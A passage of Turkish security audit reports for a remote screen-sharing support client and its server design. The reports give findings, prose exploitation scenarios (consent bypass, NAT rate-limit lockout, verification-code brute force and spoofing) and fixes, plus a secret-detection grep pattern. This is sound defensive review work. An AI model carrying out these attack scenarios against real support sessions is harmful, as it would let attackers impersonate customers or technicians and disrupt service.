# Güvenlik Raporu — P8b-2 — Tur 2 — Windows Go istemci 0.9.0 düzeltme doğrulaması (2026-11-12)
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 1

Kapsam: `docs/implementation.md` "Backend (Go) P8b-2 — düzeltme turu 1" maddeleri (S8b2-1..3, QA-P8b2-1/2, QA öneri 2/3). Değişen dosyalar incelendi: `request/{run,policy,wait,ws,validate,types}.go`, `api/api.go`, `ui/{request,control,screens}_windows.go`, `flow/flow.go`, `cmd/noktadestek/main.go`. Ek olarak sunucuda `request.accepted` üretimine bakıldı (`apps/server/src/requests/panel.ts:102-136`, `ws.ts:86`).

## Tur 1 bulgularının durumu
| # | Durum | Kanıt |
|---|---|---|
| S8b2-1 [Orta] | **Kapandı** | Koruma iki katmanlı. (1) Saf karar `rememberPlan` (`request/run.go:262-271`): kutu hatırlanan veriyle işaretli açılmışsa ve normalize ad **veya** telefon farklıysa, müşteri kutuya kendisi dokunmadıkça (`RememberChosen=false`) kayıt yapılmaz. Bu durumda dosya silinir (`run.go:301-303`) ve `deviceKey` gönderilmez (`:309-311`). Müşteri kutuyu kendisi işaretlerse kişi değişince yeni anahtar üretilir (`:304-306`, tek üretim yolu `newKey()`). Başka kişinin cihaz anahtarı taşınmaz. (2) Arayüzde ad/telefon `EN_CHANGE` olunca, müşteri kutuya dokunmamışsa kutu işaretsize çekilir (`ui/request_windows.go:220-227`). Programatik `SetText`, `filling` bayrağıyla müşteri düzenlemesi sayılmaz (`:252-257`). `chosen` yalnız `BN_CLICKED` ile true olur. UI katmanı atlansa bile saf karar korur. Testler: `TestAC136RememberPlan`, `TestAC136ChangedIdentityNotSavedWithoutOptIn`. |
| S8b2-2 [Düşük] | **Kapandı** | `dialRetryDelay` (`request/policy.go:99-110`) bekleme aralıklarını 2→4→8→15 sn tavanına kadar artırıyor ve üzerine `crypto/rand` jitter ekliyor. `Retry-After` en az o kadar bekletiyor, en çok 60 sn'ye kırpılıyor. Sonuç kalan bütçeyle sınırlı (`min(d,left)`, negatif değilse). `startDial` (`wait.go:121-156`) her başarısız denemede (429, 503, ağ) bu gecikmeyi uyguluyor. 403/426 kesin hata olarak kalıyor. Bütçe dolunca `errReconnectTimeout` dönüyor (110 sn, sunucunun 120 sn'sinin altında). Tek istemcinin upgrade sayısı 110 sn'de ~30'dan ~10'a indi. Upgrade `Retry-After` değeri `ws.go:196` ile okunuyor. REST ve WS aynı `api.ParseRetryAfter`'ı kullanıyor. Not: Çok büyük bir `Retry-After` değerinde `time.Duration` taşabilir, ama sonuç iki çağıranda da kırpılıyor (`>0` denetimi + 60 sn / 1..15 sn). Kaynak TLS doğrulamalı gömülü sunucu olduğu için bulgu sayılmadı. Sunucu tarafı (güvenilen CIDR'ın `wsUpgrade`'den muaf tutulması) "Sonra"da kalıyor. |
| S8b2-3 [Düşük] | **Kapandı, bir artık var → S8b2-4** | Tek süzgeç `request.Display` (`validate.go:112-125`) kullanılıyor. Satır/paragraf ayırıcıları, CR/LF ve sekme boşluğa çevriliyor. Cc/Cf (bidi U+202A–E, U+2066–9, ZW*), U+034F ve U+180E çıkarılıyor. Süzgeç, doğrulamadan **sonra** ve arayüzden **önce** her yerde uygulanıyor: `tenant.name` (`run.go:202`), `technicianName` (`ws.go:115`, boşsa "Teknisyen"), `request.closed.message` (`ws.go:128`), WS `error.message` (`:140`), REST `fields`/`message` (`run.go:343,359`). Uzunluk denetimi ham değerde yapılıyor, süzme yalnız kısaltıyor. Reddetme yerine süzme seçildi; kaynak güvenilir olduğu için kabul edildi. Farklı teknisyen adıyla gelen yeniden kabulde diyalog `closeDlg` ile kapatılıyor (`finish` geri çağrı yapmıyor, yani istem dışı decline/share yok) ve yeni `consentDlg` açılıyor. Böylece P7 kuralları baştan uygulanıyor: odak "Vazgeç"te, `present` içinde 1,5 sn kilit yeniden başlıyor (`control_windows.go:124-133`), `noKey` var, `userInput` kontrolü var, diyalog imleç dışında açılıyor, `FlashWindow` çalışıyor. P7 onay kuralları korunuyor. |

## Bulgular (öncelik sırasıyla)

### [DÜŞÜK] S8b2-4 Yeniden kabulde diyalog kimliği yalnız teknisyen adıyla karşılaştırılıyor; aynı adlı başka teknisyen doğrulama kodunu kilit yeniden başlamadan değiştirebiliyor — A04 (savunma derinliği)
Yer: `apps/agent-win/internal/ui/request_windows.go:356-360`; sunucu `apps/server/src/requests/panel.ts:102,136` (her kabulde yeni `techVerifyCode`), `ws.ts:86` (yeniden bağlanmada aynı oturumun kodu).
Sorun: Açık onay diyaloğuna aynı `technicianName` ile yeni `request.accepted` gelirse yalnız gövde güncelleniyor. Gövdede **teknisyen doğrulama kodu** da var. Bu durumda 1,5 sn kilit yeniden başlamıyor. Aynı tenant'ta aynı ada sahip iki teknisyen olabilir (ad benzersiz değil; S8b2-3 süzgecinden sonra görsel olarak aynı görünen adlar da buna dahil). İkinci teknisyen talebi yeniden kabul ederse doğrulama kodu müşterinin gözü önünde değişir ve onay düğmesi etkin kalır.
İstismar senaryosu: Müşteri telefondaki teknisyenle kodu karşılaştırmış ve "Ekranımı paylaş"a uzanıyor. Aynı firmada aynı adı taşıyan kötü niyetli ikinci bir teknisyen o sırada talebi yeniden kabul eder. Kod sessizce değişir ve müşteri tıklayınca ekranı ikinci teknisyenle paylaşır. Bunun için tenant içinde yetkili bir iç kişi ve dar bir zamanlama gerekiyor; yeniden kabulün sunucuda yetki ve audit kuralları var. Bu yüzden etki düşük.
Düzeltme (backend-dev, istemci): Diyalog anahtarı `TechName + TechVerifyCode` olmalı. Aynı oturumun yeniden bağlanması aynı kodu getirdiği için (`ws.ts:86`) gövdeyi yerinde güncelleme yolu yalnız gerçek yeniden bağlanmada çalışır. Kod farklıysa diyalog kapatılıp yeniden açılmalı (`reqAcceptTech` → `reqAcceptKey`). Bu davranış Windows elle adımı (c)'ye eklenmeli.

## QA kaynaklı değişikliklerin güvenlik değerlendirmesi (bulgu yok)
- **`ReleaseKind` / 1001** (`wait.go:238-252`, `main.go:131-139`, `flow.go:337-384`): Yalnız `/ws/guest` ağ/protokol hatasında 1001 gönderiliyor, REST iptali yapılmıyor. Müşterinin kararı ve sunucunun son durumu 1000 (decline) olarak gidiyor. 1001 talebi ACCEPTED bırakıyor ve 60 sn sonra sunucu CONNECT_FAILED yazıyor. Oturum açılmadığı için ekran paylaşımı yok, kötüye kullanım yüzeyi de yok. `sync.Once` sayesinde tek sefer çalışıyor. `Failed` yalnız hata yollarında true; kullanıcı vazgeçmesi hata olarak gösterilmiyor. mimari-protokol §5.1 ile tutarlı.
- **`remember` silme hatası** (`run.go:247-255`): `forget()` başarısızlığı artık yutulmuyor. `forgetWarn` başarılı bir silmeye kadar formda ve bekleme ekranında kalıyor; "silindi" yanıltıcı mesajı gösterilmiyor. Silme başarısız olsa da bellekteki `r.rem` temizlendiği için bu gönderimde eski `deviceKey` gönderilmiyor. Uyarı sabit metin; yol veya hata ayrıntısı sızdırmıyor.
- **`remember.NewDeviceKey` kaldırıldı**: Tek rastgelelik yolu `newKey()` (`crypto/rand`, 128 bit).
- **Tab sırası / "Kötüye kullanımı bildir"**: Güvenlik etkisi yok. `OpenMailto` hâlâ yalnız `ValidAbuseEmail`'den geçmiş adresle çağrılıyor.

## Otomatik tarama çıktıları
- `go test ./...` (docker `golang:1.26.11-bookworm@sha256:dc40a1…`, `-mod=readonly`, `GOTOOLCHAIN=local`): **17 paket ok**. `go vet ./...` ve `GOOS=windows go vet ./...`: çıktı yok (temiz).
- Gizli bilgi regex'i: `git grep` (`apps/agent-win`) 0 eşleşme. İzlenmeyen yeni dosyalar (`internal/request`, `internal/remember`, `api/requests.go`, `ui/request_windows.go`) `grep` ile tarandı: 0 eşleşme.
- `go.mod`/`go.sum` değişmedi. Yeni bağımlılık yok.

## Tasarımda vaat edilip kodda bulunmayanlar
- G-E9-13 "kutucuk varsayılan işaretsiz": Kişi değişikliği için açık rıza artık sağlanıyor. Aynı kişi için işaretli açılış Tur 1'de kabul edildi. Ek eksik yok.
- Windows'a özgü doğrulamalar (EN_CHANGE ile kutu düşmesi, kilitli `hatirla.bin`, teknisyen değişiminde diyaloğun yeniden açılması) kodda var ama yalnız elle doğrulanabilir. implementation.md Windows ek adımları (a)–(c) test-operatoru tarafından koşulmalı.

## Olumlu
- S8b2-1 iki katmanlı çözüldü (UI + saf karar). Arayüz atlansa bile başka kişinin verisi rızasız yazılmıyor ve cihaz anahtarı kişiye bağlı.
- Yeniden bağlanma politikası sunucu kovasını koruyor ve bütçeyi aşmıyor. Saf fonksiyon olduğu için testli.
- Sunucu metinleri tek süzgeçten geçiyor. Doğrulama ham değerde, süzme gösterimde yapılıyor.
- Diyalog yeniden açılırken mevcut P7 `consentDlg` yeniden kullanılıyor; yeni bir onay yolu eklenmedi.

Karar: Kritik/Yüksek 0 → **GEÇTİ**. S8b2-4 (Düşük) 0.9.0'da tek satırlık bir düzeltmeyle kapatılabilir. Kapatılmazsa `docs/gereksinimler.md` §9'a "Sonra" olarak yazılmalı.

---

# Güvenlik Raporu — P8b-2 — Tur 1 — Windows Go istemci 0.9.0 (2026-11-12)
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 1 / Düşük 2

Kapsam: `apps/agent-win` çalışma ağacı diff'i (commit edilmemiş): `internal/request/*` (yeni), `internal/remember/*` (yeni), `internal/api/{api,requests}.go`, `internal/pairing`, `internal/flow`, `internal/signal/{strict,messages}.go`, `internal/ui/{request,control,screens}_windows.go`, `internal/win/win_windows.go`, `cmd/noktadestek/main.go`. Bu kod mimari-e9 §13 (G-E9-1..14), ADR-0004 r3, ADR-0006 r4, ADR-0016, mimari-protokol §5 ve P7 onay kurallarıyla karşılaştırıldı. Sunucu tarafına yalnız `/ws/request` upgrade sınırlarını görmek için bakıldı (`apps/server/src/requests/ws.ts`, `limits.ts`).

## Bulgular (öncelik sırasıyla)

### [ORTA] S8b2-1 Hatırlanan veriyle açılışta "hatırla" kutusu işaretli geliyor; başka kişinin verisi onaysız diske yazılabilir (implementation sapma #1) — A04 / KVKK açık rıza
Yer: `apps/agent-win/internal/request/run.go:110` (`Remember: true`), `:266-285` (gönderimde kayıt), `internal/ui/request_windows.go:243`
Sorun: G-E9-13 / AC-136 kutunun varsayılan olarak işaretsiz olmasını istiyor (kullanıcı kararı). Ancak `hatirla.bin` varsa form kutu işaretli açılıyor. Kod, gönderilen ad ve telefonun hatırlanan kişiye ait olup olmadığına bakmıyor. Kayıt (`Save`) her durumda yapılıyor ve önceki kişinin `deviceKey`'i yeniden kullanılıyor.
İstismar senaryosu: Paylaşılan bir Windows hesabında (aile bilgisayarı, ofiste ortak hesap, internet kafe) A daha önce "hatırla" demiş olsun. B formu açar, alanları kendi ad/telefon/e-postasıyla değiştirir ve işaretli kutuyu fark etmez. B'nin kişisel verisi, B hiç seçmeden kalıcı olarak diske yazılır. Sonraki kullanıcı da bu veriyi görür. Sunucu B'nin taleplerini A'nın cihaz anahtarıyla `known_device=true` olarak işaretler. Bu bir yetki ihlali değil, ancak rıza ilkesine ve kullanıcının açık kararına aykırı.
Gerekçenin değerlendirmesi: "İşaretsiz gelseydi her gönderim dosyayı silerdi" itirazı doğru. Bu yüzden düz geri alma yerine aşağıdaki orta yol öneriliyor.
Düzeltme (backend-dev, istemci): Kutu hatırlanan veriyle işaretli açılabilir. Ancak gönderimde normalize edilmiş ad **veya** telefon `r.rem` ile farklıysa ve kullanıcı kutuyu bu oturumda kendisi işaretlememişse, kişi değişmiş sayılmalı:
- kayıt yapılmaz, dosya silinir (AC-137 yolu) ve `deviceKey` gönderilmez;
- ya da kişi değişikliği algılanınca kutu işaretsize çekilir ve "Bu bilgisayarda hatırlansın mı?" yeniden sorulur. Alternatif: ad/telefon alanında `EN_CHANGE` olunca kutu işaretsize çekilir.
Ayrıca: Kişi değiştiğinde yeni `deviceKey` üretilmesi tercih edilir. Test: `TestAC136ChangedIdentityNotSavedWithoutOptIn`. Kılavuza da bir cümle eklenmeli.

### [DÜŞÜK] S8b2-2 `/ws/request` yeniden bağlanma döngüsü 429'u kalıcı saymıyor ve sabit 2 sn aralıkla deniyor; NAT arkasında ortak IP kovası tükeniyor — A04 (S8b-8 istemci tarafı)
Yer: `apps/agent-win/internal/request/wait.go:118-151` (`startDial`; yalnız 403/426 kesin hata), `run.go:97-98` (`ReconnectEvery` 2 sn). Sunucu: `apps/server/src/requests/limits.ts:77` (`wsUpgrade` 31/dk/ipKey, blok 1 dk), `ws.ts:59,76` (güvenilen CIDR yalnız `ip_sockets`'ten muaf, `wsUpgrade`'den değil).
Sorun: Tek istemci 110 sn boyunca dakikada yaklaşık 30 upgrade deniyor. Bu sayı tek başına sınırın (31) hemen altında. Aynı genel IP arkasında iki veya daha fazla bekleyen müşteri varsa (kurumsal NAT, US-29) sunucu yeniden başladıktan sonra hepsi birlikte 429 bloğuna girer. İstemciler blok sırasında da 2 sn'de bir denemeye devam eder. 110 sn dolunca "Sunucuyla bağlantı kesildi" görünür ve talep sunucuda 120 sn'de `DISCONNECTED` ile iptal olur. `Retry-After` ve jitter yalnız POST create'te kullanılıyor; WS dial'de kullanılmıyor.
İstismar senaryosu: Saldırgan, hedef ofisle aynı NAT'tan (ör. misafir Wi-Fi) dakikada 31 upgrade göndererek ofisin bekleyen taleplerinin yeniden bağlanmasını 1 dk engeller. Kopma süresi 120 sn olduğu için iki blok penceresi talepleri iptal ettirebilir. Etki yalnız kullanılabilirlik.
Düzeltme (backend-dev, istemci): Dial 429'da üstel geri çekilme uygulanmalı: 2→4→8→15 sn, artı 0..1 sn `crypto/rand` jitter. Upgrade yanıtında `Retry-After` varsa ona uyulmalı. Normal yeniden bağlanma aralığına da jitter eklenmeli. Sunucu tarafında güvenilen CIDR'ın `wsUpgrade` kovasından da muaf tutulması değerlendirilmeli (backend-dev, "Sonra").

### [DÜŞÜK] S8b2-3 Sunucudan gelen görünen metinlerde Unicode biçim/bidi karakterleri istemcide süzülmüyor; yeniden kabulde başlık güncellenmiyor — A03 (savunma derinliği)
Yer: `apps/agent-win/internal/request/ws.go:109` (`technicianName` yalnız uzunluk denetimi), `run.go:197-228` (`tenant.name` denetimsiz; pencere başlığı ve büyük etiket), `ui/request_windows.go:335-338` (açık diyalogda yeni `request.accepted` gelirse yalnız gövde güncelleniyor, `<Teknisyen> bağlanmak istiyor` başlığı güncellenmiyor).
Sorun: Firma adı ve teknisyen adı, kullanıcının "kime bağlanıyorum" kararının temelidir. U+202E (RLO) ve benzeri `Cf` karakterleri statik metinde görünümü değiştirebilir. Kaynak TLS doğrulamalı gömülü sunucudur ve yazan kişi tenant yöneticisidir. Bu nedenle risk düşük. Yine de istemcinin hatırlama dosyası için uyguladığı `hasControl` kuralı bu alanlara uygulanmıyor.
Düzeltme (backend-dev, istemci): `tenant.name`, `technicianName`, `request.closed.message` ve hata `fields`/`message` metinleri için `Cc/Cf` içeren değer reddedilmeli (ws: 1008, REST: `BAD_RESPONSE` → ağ hatası ekranı) veya bu karakterler çıkarılmalı. Ayrıca `RequestAccepted` yeniden çağrıldığında teknisyen adı farklıysa diyalog kapatılıp yeniden açılmalı (1,5 sn kilit yeniden başlar). Sunucu şemalarında aynı kural yoksa backend'e de eklenmeli.

## Odak maddelerinin doğrulaması (bulgu yok)
- **OpenURL / 426 indirme bağlantısı:** URL, sunucu yanıtından gelmiyor. `DownloadURL` (`policy.go:78-84`) yalnız gömülü `cfg.ServerURL`'in https kökü, sabit yol ve `^[a-z2-7]{16}$` ile doğrulanmış ref'ten oluşuyor. `win.OpenURL` (`win_windows.go:568`) ikinci kez yalnız `https://` kabul ediyor ve boşluk, tırnak, CR/LF içeren değeri reddediyor. 426 yanıtı (REST `CLIENT_OUTDATED` veya WS upgrade) yalnız yerel engel ekranını tetikliyor. Kod modunda indirme düğmesi yok (`flow/messages.go` msgOutdated). `minAgentVersion` biçim dışıysa yanlış alarm verilmiyor.
- **"Kötüye kullanımı bildir":** `OpenMailto` yalnız `api.ValidAbuseEmail` kuralından geçmiş adresle çağrılıyor (`run.go:198`).
- **Sunucu metinleri UI'da:** Tüm metinler `STATIC` + `SS_NOPREFIX` (`form_windows.go:310`) ile gösteriliyor. Aydınlatma metni salt okunur EDIT içinde. Ret mesajı ≤ 200 UTF-16 ve yalnız `REJECTED` ile birlikte kabul ediliyor, bağlantıya çevrilmiyor (G-E9-12 istemci tarafı tamam). Logo şu an `null`. Gelirse P6 `LogoURL`/`DecodeLogo` kuralları (aynı köken, PNG/JPG sihirli bayt, ≤ 2 MB, yönlendirme yok) uygulanıyor.
- **`/ws/request` sırrı (protokol §5):** Sır yalnız `Sec-WebSocket-Protocol` (`rs.req.<sır>`) ile gidiyor. URL'de sorgu dizesi ve Origin yok (`ws.go:179-183`). Dial öncesi `^[A-Za-z0-9_-]{43}$` ile doğrulanıyor. Hata metinleri sır içermiyor ("upgrade reddedildi"). Ajan kodunda log çağrısı yok (`log`/`slog`/`Printf` 0). Sır diske yazılmıyor (`remember.Data` alanlarında yok). Yönlendirme ile sır sızıntısı da yok: `coder/websocket` `CheckRedirect`'i zincirliyor ve istemcinin `http.ErrUseLastResponse`'u (`api.go:87`) korunuyor (modül kaynağı `dial.go:88-102` ile doğrulandı).
- **TLS:** Sistem kökleri ve `MinVersion` TLS 1.2 kullanılıyor; `InsecureSkipVerify` 0. Talep, WS ve logo aynı `http.Client`'ı paylaşıyor. Sertifika hatası ayrı mesajla gösteriliyor ve doğrulama gevşetilmiyor.
- **DPAPI / dosya:** `CryptProtectData` CurrentUser kapsamında (LOCAL_MACHINE bayrağı yok), `UI_FORBIDDEN` ve sabit entropi ile çağrılıyor. `FOLDERID_LocalAppData\NoktaDestek\hatirla.bin` kullanılıyor (Roaming değil). Düz metin ≤ 4 KB, mühürlü ≤ 16 KB. `DisallowUnknownFields` ve alan doğrulaması var; bozuk veya başka kullanıcıya ait dosya sessizce siliniyor. tmp dosyası `O_EXCL` ile açılıyor; varsa bir kez silinip yeniden deneniyor (G-E9-13), ardından rename ediliyor. "Unut" işlemi dosyayı, tmp'yi ve klasörü (yalnız boşsa) siliyor. ACL `%LOCALAPPDATA%`'dan miras kalıyor (kullanıcı + SYSTEM + Administrators); `0o600` Windows'ta etkisiz ama gereksiz de değil. Açıklama, onay, sır ve ref yazılmıyor.
- **Rastgelelik:** `deviceKey`, `clientInstanceId` ve jitter `crypto/rand` ile üretiliyor (128 bit). `deviceKey` yalnız kutu işaretliyken üretiliyor ve gönderiliyor; işaretsiz gönderimde dosya ile birlikte siliniyor (G-E9-1 / ADR-0004 r3 eki).
- **Yeniden deneme (S8b-8 istemci tarafı):** Create isteği yalnız 503 + `NOT_READY` durumunda tekrarlanıyor: en çok 2 deneme, `Retry-After` 1..15 sn'ye kırpılıyor, üzerine jitter ekleniyor. Ağ hatası ve 502/504 tekrarlanmıyor (çift talep veya kota tüketimi olmasın diye; doğru karar). GET tenant en çok 3 deneme yapıyor. S8b-8'in istemci yarısı karşılandı; sunucu yarısı (kova iadesi) "Sonra"da açık.
- **Kapanış kodları ve durum makinesi:** `CANCELLING` durumunda geç gelen `request.accepted` yok sayılıyor ve `request.decline` gönderiliyor (§13.3 yarışı). Pencere kapatma önce mesaj, sonra 1000 gönderiyor. Bilet süresi dolunca 1001 ile kapanıyor (vazgeçme değil, CONNECT_FAILED). `/ws/request` `/ws/guest` `hello`'su gelene kadar açık kalıyor; `Release` bir kez çalışıyor. Sözleşme dışı mesajda 1008 gönderiliyor ve yeniden bağlanılmıyor; 4409'da da yeniden bağlanılmıyor. Giden mesajlar yalnız iki sabit tipten oluşuyor (`Encode`). Sunucu durumunu kötüye kullanacak bir istemci davranışı bulunmadı.
- **Onay ("Ekranımı paylaş / Vazgeç") ve P7 kuralları:** Ortak `consentDlg` kullanılıyor. Odak "Vazgeç"te. Enter/Space `noKey` ile engelleniyor. 1,5 sn kilit var ve `present` ile yeniden başlıyor. `tryGrant` yalnız yerel donanım girdisini kabul ediyor (`userInput`); enjekte tıklamada kırmızı uyarı çıkıyor ve kilit yeniden başlıyor. Diyalog imleç dışında açılıyor ve `FlashWindow` kullanılıyor. Otomatik onay veya geri sayımla onay yok. Erişim tuşu (`&E`) P7 "&İzin ver" ile aynı model (TrigAccessKey kuralları geçerli). Yeniden bağlanmada gelen yeni ticket kilidi atlatmıyor. Kontrol izni `RunTicket` sonrası P7 yolundan değişmeden alınıyor (AC-156).
- **Dosya adı (ADR-0006 r4):** `RefFromFileName` anchored ifade kullanıyor: label `[A-Za-z0-9]{1,20}`, ref base32 16. Yol ayırıcıları `\` ve `/`'den kesiliyor. Label hiçbir yerde gösterilmiyor (G-E9-11); pencere yalnız sunucudan gelen firma adını gösteriyor. Firma ve kod biçimleri ayrık (`TestAC161FileNameModesAreDisjoint`).
- **DLL arama sırası:** Yeni kod yalnız `x/sys/windows` (crypt32, shell32 → `NewLazySystemDLL`) ve mevcut `shell32` (`NewLazySystemDLL`) kullanıyor. `NewLazyDLL`/`LoadLibrary` eklenmedi. `dllsafe.Harden()` hâlâ `main.go:51`'de, ilk iş olarak çağrılıyor.

## implementation.md "Backend (Go) P8b-2" sapmalarının değerlendirmesi
| # | Karar |
|---|---|
| 1 | Kısmen kabul → **S8b2-1** (Orta): işaretli açılış kalabilir, ancak kişi değişikliğinde açık rıza gerekiyor. |
| 2 | Kabul (tek pencere; güvenlik etkisi yok). |
| 3 | Kabul ("Unut" her zaman görünür; zararsız ve hatta iyi). |
| 4 | Güvenlik açısından kabul (110 sn < 120 sn; 403/426/4409/1008 kesin). Yeniden deneme aralığı → S8b2-2. |
| 5 | Kabul (1001 = bağlanamadı; tasarıma uygun). |
| 6 | Kabul (`FlashWindow` eşdeğer). |
| 7 | Kabul (logo kuralları P6'dan aynen). |
| 8 | Kabul (strict kural tek yerde). |
| 9 | Kabul (`os.Rename` Windows'ta `MoveFileEx(REPLACE_EXISTING)`; crypt32 sistem DLL'i). |

## Otomatik tarama çıktıları
- `go test ./...` (docker `golang:1.26.11-bookworm@sha256:dc40a1…`, `-mod=readonly`): **17 paket ok** (`request`, `remember`, `api`, `flow`, `pairing` dahil). `go vet ./...` ve `GOOS=windows go vet ./...`: çıktı yok (temiz).
- Gizli bilgi regex'i (`git grep -nE "(api[_-]?key|secret|password|token)\s*[:=]\s*['\"][^'\"]{8,}"` → `apps/agent-win`): **0 eşleşme**. Not: yeni dosyalar izlenmediği (untracked) için git grep onları taramaz; `internal/request`, `internal/remember` ve `ui/request_windows.go` elle incelendi, gerçek gizli değer yok. Test sabitleri `AAAA…` biçiminde.
- `.env` geçmişi: Yalnız `.env.example` git geçmişinde.
- Bağımlılık: `go.mod`/`go.sum` değişmedi. Yeni bağımlılık yok.

## Tasarımda vaat edilip kodda bulunmayanlar
- G-E9-13 "kutucuk varsayılan işaretsiz": Hatırlanan veri varken uygulanmıyor → S8b2-1.
- Windows'a özgü maddeler (iz testi, gerçek DPAPI başka kullanıcı testi, RDP enjekte tıklama, gerçek ağda yeniden bağlanma) kodda var ama yalnız elle doğrulanabilir. `implementation.md` Windows adımları 2, 5, 11 ve 13 test-operatoru tarafından koşulmalı. Bu tur kod okumasıyla sınırlı.

## Olumlu
- Talep modu platformdan bağımsız ve arayüzlerle sahte bileşenlere bağlanıyor. Durum makinesi saf ve yarışlar testli (`CANCELLING` / geç kabul).
- Sunucu girdisi strictObject ve alan kurallarıyla tek yerde (`signal.DecodeStrict`) doğrulanıyor; ihlalde 1008 gönderiliyor.
- Açılabilecek tek URL yerel olarak kuruluyor ve iki katmanda denetleniyor. Sır yalnız subprotocol'de taşınıyor, loglama hiç yok.
- Yeniden deneme politikası kotayı bilinçli olarak koruyor (create'te ağ hatası tekrarlanmıyor).
- Hatırlama dosyası, rıza ve kişi değişikliği sorunu (S8b2-1) dışında ADR-0004 r3'e eksiksiz uyuyor.

Karar: Kritik/Yüksek 0 → **GEÇTİ**. S8b2-1 (Orta) 0.9.0 yayınından önce düzeltilmesi önerilir; tek fonksiyonluk bir değişiklik. Düzeltilmezse `docs/gereksinimler.md` §9'a "Sonra" olarak yazılmalı. S8b2-2 ve S8b2-3 (Düşük) "Sonra" listesine eklenmeli.

---

# Güvenlik Raporu — Tasarım turu (Tur 0, kod yok)
Tarih: 2026-11-10 · Kapsam: `docs/mimari.md` §5, `docs/tasarim-kontrol.md` §4, mimari-protokol/akislar/api, ADR-0006/0007/0009/0010
DURUM: DÜZELTİLMELİ (tasarım; ilgili paket başlamadan mimari/AC güncellenmeli)
Özet: Kritik 0 / Yüksek 8 / Orta 10 / Düşük 7

Yöntem: Kod olmadığı için "Yer" = belge:satır/bölüm. Otomatik tarama uygulanamadı (bkz. sondaki bölüm).

## K6 kararı (teknisyen "Katılımcıyı kabul et") — KARAR: EKLENSİN, P3'te, zorunlu
Gerekçe (G-01): ADR-0006'nın kendi hesabı N=50 aktif kodda %9 başarı veriyor; dahası mevcut `verifyCode`
müşteriyi **doğrulamıyor** — `resolve` yanıtında katılan herkese döndürülüyor (mimari-api.md Public tablo),
yani kodu tahmin eden saldırgan da aynı 4 haneyi görür ve telefonda "doğru" okuyabilir. Kabul adımı olmadan
teknisyenin sahte müşteriyi ayırt edecek güvenilir bir sinyali yok. Uygulama biçimi G-01'de.

## Bulgular (öncelik sırasıyla)

### [YÜKSEK] G-01 Müşteri yerine geçme: verifyCode yön hatası + kabul adımı yok — A07 Kimlik Doğrulama Hataları
Yer: mimari.md:166 (T1), mimari-api.md Public `resolve` çıktısı (`verifyCode`), adr/0006 "Sonuçlar", mimari.md:414 (K6)
- Tehdit: A1/A2 kodu brute-force eder (veya linki ele geçirir), `join` ile oturumu tüketir; gerçek müşteri 410 alır
  (DoS), teknisyen sahte uca chat/dosya/talimat gönderir; teknisyen "verifyCode'u okuyun" dediğinde saldırgan da okur.
- Eksik kontrol: katılan tarafın kimliğine bağlı, yalnız ona gösterilen bir sır yok; join anında tüketim gerçek
  müşteriyi kilitliyor; teknisyen onayı olmadan SDP akıyor.
- Önerilen tasarım:
  1. `join` oturumu **tüketmez**; misafir `LOBBY` durumuna girer. Sunucu misafir başına rastgele 4 haneli
     `admitCode` üretir, yalnız o misafire döner (`join` yanıtı), DB/bellekte hash.
  2. Konsola `peer.pending{guestId, name, guestKind, ipCountry?}`; teknisyen müşteriden telefonda `admitCode`'u
     okumasını ister → `guest.admit{guestId}` / `guest.reject{guestId}`. Kabul gelmeden SDP/ICE iletilmez,
     TURN credential verilmez (credential `admit` sonrası `hello` ile).
  3. Tüketim (`consumed_at`, ACTIVE, `active_code=NULL`) **admit** transaction'ında. Reddedilen misafir
     `session.ended{rejected}` alır; kod geçerli kalır → gerçek müşteri kilitlenmez.
  4. Lobide eşzamanlı en çok 3 misafir; lobi bekleme 5 dk; teknisyen 3 ret sonrası "Oturumu iptal et, yenisini aç" önerisi.
  5. Mevcut `verifyCode` adı "Teknisyen doğrulama kodu" olur ve yalnız müşterinin teknisyeni doğrulaması için
     kullanılır; belgede "müşteriyi doğrulamaz" diye yazılır. Kod 6→8 haneye çıkarma ayrıca önerilir (G-02 ile).
  6. Audit: `guest.pending`, `guest.admitted`, `guest.rejected` (ip, ad).
- Paket: P3 (protokol + oda durum makinesi), P4 (konsol lobi UI, müşteri bekleme ekranı), P6 (istemci bekleme ekranı), P2 (durum makinesi alanları).

### [YÜKSEK] G-02 Global başarısız-kod limiti kendisi DoS aracı — A04 Güvensiz Tasarım
Yer: mimari.md:166, adr/0006 "Karar" (global 60/dk, aşımda kod yolu 60 sn 429)
- Tehdit: tek saldırgan dakikada 61 yanlış kod göndererek **tüm tenant'ların** kod ile katılımını kalıcı kapatır
  (Go istemci yolu tamamen kod/dosya adına dayalı → tam erişim modu ölür).
- Eksik kontrol: global sayaç kaynak ayırt etmiyor; üstel ceza ve ağ öneki bazlı sayaç yok.
- Önerilen tasarım: sayaçlar IPv4 /24 ve IPv6 /56 öneki bazında (10/dk) + IP bazında üstel bekleme;
  global sayaç **engelleme değil alarm** eşiği olsun; global eşik aşılırsa yalnız ilgili önekler engellenir.
  Kod 8 haneye (10⁸) çıkarılırsa dağıtık saldırı başarısı ~%0,09'a (N=50) iner; telefonda "4-4" grup okunur.
  Dosya adı yolunda kod okunduğundan uzunluk artışı kullanıcıya maliyetsiz. Token yolu etkilenmez (mevcut).
- Paket: P2 (`codes.ts`), P3 (`rate.ts`, resolve).

### [YÜKSEK] G-03 Kontrol izin diyaloğu tıklama/tuş tuzağı ve spam — A04 Güvensiz Tasarım
Yer: mimari-akislar.md A3, mimari-protokol.md §4.3 (1), adr/0009
- Tehdit: A3 teknisyen `control.request`'i müşteri yazarken/tıklarken art arda gönderir; diyalog odağı alır,
  müşterinin Enter/Space/tıklaması "İzin ver"e düşer → rıza dışı kontrol. Enjekte olmayan olay filtresi bunu engellemez.
- Eksik kontrol: varsayılan buton, giriş gecikmesi, istek hız sınırı tanımlı değil.
- Önerilen tasarım: diyalogda varsayılan/odak "Reddet"; Enter/Space "İzin ver"i tetiklemez; butonlar 1,5 sn
  sonra etkin; diyalog açılırken o anki fare konumunun altında açılmaz; `control.request` sunucuda oturum başına
  ret sonrası 30 sn bekleme + en çok 5 istek/oturum; aynı kurallar `monitor.request` ve `file.offer` kabul diyaloğu için.
  AC-99'a ek kabul kriteri: "İlk 1,5 sn tıklama ve klavye 'İzin ver'i tetiklemez".
- Paket: P7 (gate/ui, server handlers), P5/P6 (dosya kabul diyaloğu).

### [YÜKSEK] G-04 Aktif oturumu yönetici kesemez; hesap/yetki iptali canlı oturumu durdurmaz — A01 Erişim Kontrolü
